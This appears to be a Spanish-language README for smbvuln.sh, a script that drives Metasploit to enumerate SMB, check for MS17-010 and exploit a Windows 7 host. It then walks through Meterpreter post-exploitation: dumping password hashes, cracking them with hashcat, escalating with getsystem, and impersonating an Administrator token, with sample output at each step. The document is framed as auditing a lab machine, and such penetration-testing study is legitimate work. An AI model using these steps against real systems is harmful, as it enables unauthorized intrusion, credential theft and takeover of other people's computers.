Antes de ejecutar el archivo smbvuln.sh deben de tener instaldo metasploit.

El archivo se tiene que ejecutar en modo sudo.

Ejecutar el siguiente comando

chmod +x smbvuln.sh

Despues de haber modificado los permisos del archivo procederemos a ejecutar el siguiente comando.

./smbvuln.sh


El escript contiene las siguiente opciones para realizar los escaneos.

1) Enumeración del servicio SMB
2) Verificar si el equipo es vulnerable
3) Hacer el exploit al equipo
 	
1) Para la primera opción se realizará la emumeración de los servicios SMB en el puerto 445

Ejemplo

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7600 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: WIN-CIHA5D1NVML
|   NetBIOS computer name: WIN-CIHA5D1NVML\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-05-29T11:33:32-05:00
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-05-29T16:33:32
|_  start_date: 2024-05-28T16:52:33
|_nbstat: NetBIOS name: WIN-CIHA5D1NVML, NetBIOS user: <unknown>, NetBIOS MAC: 000c291f41e1 (VMware)

2) Para la opción 2 se hace una verificación de servicio que sea vulnerable y se pueda ejecutar el exploit

Ejemplo

ORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:1F:41:E1 (VMware)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:


3) Al selecionar la opción 3 nos pedirá que proporcionemos la ip del equipo que vas a auditar y posteriormente se ejecutará el script

Para saber si se ejecutó correctamente nos saldrá algo parecido a lo siguiente:

[*] Meterpreter session 1 opened (192.1xx.xxx.xxx:4444 -> 192.16x.xxx.xxxx:49236) at 20xx-0x-xx 13:40:35 -0400
[+] 192.1xx.xxx.xxx:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.1xx.xxx.xxx:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.1xx.xxx.xxx:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Cuando estemos en este punto podremos ejecutar alguno de los siguientes puntos:

1.- Obtener el password Hash

Meteremos el siguiente comando

----hashdump

y este nos dara el password hash y el nombre de la cuenta.

Ejemplo: 
Administrador:500:aad3bsx3xxx5xxxxbxx5x1404ee:xxxxxxxxxxxxxxxxxxxc59d7e0c089c0:::
Invitado:501:aad3b435b51404eexxxxxxxxb51404ee:xxxxxxxxxxxxxxxxxxxc59d7e0c089c0:::

con estos datos se puede utilizar el programa de hashcat para decodificar el password

2.- Para elevación de privilegios 

Para subir de privilegios usaremos el siguiente comando 

----getuid

posteriormente

---use priv

----getsystem

---use incognito

---list_tokens -u 

se copia el token que queremos acceder

--impersonate_token WIN-CIHA5D1NVML\\Administrador


Para más comandos ingresar a la siguiente página

https://www.offsec.com/metasploit-unleashed/meterpreter-basics/
